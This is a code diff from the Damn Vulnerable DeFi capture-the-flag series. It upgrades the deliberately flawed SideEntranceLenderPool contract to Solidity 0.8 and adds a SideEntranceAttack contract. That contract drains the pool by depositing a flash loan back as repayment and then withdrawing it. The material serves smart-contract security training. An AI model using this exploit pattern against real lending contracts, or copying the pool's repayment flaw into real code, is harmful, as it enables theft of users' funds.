@@ -1,11 +1,16 @@
-pragma solidity ^0.6.0;
+// SPDX-License-Identifier: MIT
 
+pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
 
 interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
 contract SideEntranceLenderPool {
     using Address for address payable;
 
@@ -18,7 +23,7 @@ contract SideEntranceLenderPool {
     function withdraw() external {
         uint256 amountToWithdraw = balances[msg.sender];
         balances[msg.sender] = 0;
-        msg.sender.sendValue(amountToWithdraw);
+        payable(msg.sender).sendValue(amountToWithdraw);
     }
 
     function flashLoan(uint256 amount) external {
@@ -30,4 +35,25 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
- 
+
+contract SideEntranceAttack {
+
+    SideEntranceLenderPool public pool; 
+
+    constructor(address _pool) public {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+
+}
